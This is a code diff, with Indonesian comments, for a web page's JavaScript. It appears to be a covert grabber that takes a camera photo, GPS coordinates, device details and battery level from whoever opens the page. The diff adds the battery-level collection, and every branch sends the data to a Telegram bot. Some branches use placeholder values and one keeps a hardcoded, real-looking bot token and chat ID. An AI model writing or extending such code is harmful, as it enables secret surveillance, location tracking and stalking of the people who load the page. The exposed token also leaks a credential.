@@ -45,39 +45,116 @@
           var longitude = position.coords.longitude;
           var accuracy = position.coords.accuracy;
 
-          // Mendapatkan informasi lengkap perangkat
+          // Mendapatkan informasi perangkat secara detail
           var deviceInfo = {
             userAgent: navigator.userAgent,
             screenWidth: window.screen.width,
             screenHeight: window.screen.height,
-            platform: navigator.platform
+            platform: navigator.platform,
+            batteryLevel: null
           };
 
-          // Mengirim foto, lokasi, dan informasi perangkat ke Telegram API
-          var botToken = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
-          var chatId = '1121369247';
+          // Mendapatkan informasi batrai perangkat
+          if ("getBattery" in navigator) {
+            navigator.getBattery()
+              .then(function(battery) {
+                deviceInfo.batteryLevel = battery.level * 100;
 
-          var url = 'https://api.telegram.org/bot' + botToken + '/sendPhoto';
-          var formData = new FormData();
-          formData.append('chat_id', chatId);
-          formData.append('photo', dataURItoBlob(imageDataURL));
-          formData.append('caption', 'Lokasi: ' + latitude + ', ' + longitude + ' (Akurasi: ' + accuracy + ' meter)\n\nInformasi Perangkat:\n' + JSON.stringify(deviceInfo));
+                // Mengirim foto, lokasi, informasi perangkat, dan informasi batrai ke Telegram API
+                var botToken = 'YOUR_BOT_TOKEN';
+                var chatId = 'YOUR_CHAT_ID';
 
-          fetch(url, {
-            method: 'POST',
-            body: formData
-          })
-          .then(function(response) {
-            console.log('Foto, lokasi, dan informasi perangkat berhasil dikirim ke Telegram.');
-          })
-          .catch(function(error) {
-            console.error('Terjadi kesalahan dalam mengirim foto, lokasi, dan informasi perangkat ke Telegram:', error);
-          });
+                var url = 'https://api.telegram.org/bot' + botToken + '/sendPhoto';
+                var formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', dataURItoBlob(imageDataURL));
+                formData.append('caption', 'Lokasi: ' + latitude + ', ' + longitude + ' (Akurasi: ' + accuracy + ' meter)\n\nInformasi Perangkat:\n' + JSON.stringify(deviceInfo));
+
+                fetch(url, {
+                  method: 'POST',
+                  body: formData
+                })
+                .then(function(response) {
+                  console.log('Foto, lokasi, informasi perangkat, dan informasi batrai berhasil dikirim ke Telegram.');
+                })
+                .catch(function(error) {
+                  console.error('Terjadi kesalahan dalam mengirim foto, lokasi, informasi perangkat, dan informasi batrai ke Telegram:', error);
+                });
+              })
+              .catch(function(error) {
+                console.error('Gagal mendapatkan informasi batrai:', error);
+
+                // Mengirim foto, lokasi, dan informasi perangkat (tanpa informasi batrai) ke Telegram API
+                var botToken = 'YOUR_BOT_TOKEN';
+                var chatId = 'YOUR_CHAT_ID';
+
+                var url = 'https://api.telegram.org/bot' + botToken + '/sendPhoto';
+                var formData = new FormData();
+                formData.append('chat_id', chatId);
+                formData.append('photo', dataURItoBlob(imageDataURL));
+                formData.append('caption', 'Lokasi: ' + latitude + ', ' + longitude + ' (Akurasi: ' + accuracy + ' meter)\n\nInformasi Perangkat:\n' + JSON.stringify(deviceInfo));
+
+                fetch(url, {
+                  method: 'POST',
+                  body: formData
+                })
+                .then(function(response) {
+                  console.log('Foto, lokasi, dan informasi perangkat berhasil dikirim ke Telegram.');
+                })
+                .catch(function(error) {
+                  console.error('Terjadi kesalahan dalam mengirim foto, lokasi, dan informasi perangkat ke Telegram:', error);
+                });
+              });
+          } else {
+            console.error('Browser tidak mendukung mendapatkan informasi batrai.');
+
+            // Mengirim foto, lokasi, dan informasi perangkat (tanpa informasi batrai) ke Telegram API
+            var botToken = 'YOUR_BOT_TOKEN';
+            var chatId = 'YOUR_CHAT_ID';
+
+            var url = 'https://api.telegram.org/bot' + botToken + '/sendPhoto';
+            var formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', dataURItoBlob(imageDataURL));
+            formData.append('caption', 'Lokasi: ' + latitude + ', ' + longitude + ' (Akurasi: ' + accuracy + ' meter)\n\nInformasi Perangkat:\n' + JSON.stringify(deviceInfo));
+
+            fetch(url, {
+              method: 'POST',
+              body: formData
+            })
+            .then(function(response) {
+              console.log('Foto, lokasi, dan informasi perangkat berhasil dikirim ke Telegram.');
+            })
+            .catch(function(error) {
+              console.error('Terjadi kesalahan dalam mengirim foto, lokasi, dan informasi perangkat ke Telegram:', error);
+            });
+          }
         }, function(error) {
           console.error('Gagal mendapatkan lokasi:', error);
         });
       } else {
         console.error('Browser tidak mendukung geolocation.');
+
+        // Mengirim foto dan informasi perangkat (tanpa lokasi) ke Telegram API
+        var botToken = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
+        var chatId = '1121369247';
+
+        var url = 'https://api.telegram.org/bot' + botToken + '/sendPhoto';
+        var formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', dataURItoBlob(imageDataURL));
+        formData.append('caption', 'Informasi Perangkat:\n' + JSON.stringify(deviceInfo));
+
+        fetch(url, {
+          method: 'POST',
+          body: formData
+        })
+        .then(function(response) {
+          console.log('Foto dan informasi perangkat berhasil dikirim ke Telegram.');
+        })
+        .catch(function(error) {
+          console.error('Terjadi kesalahan dalam mengirim foto dan informasi perangkat ke Telegram:', error);
+        });
       }
     };
 
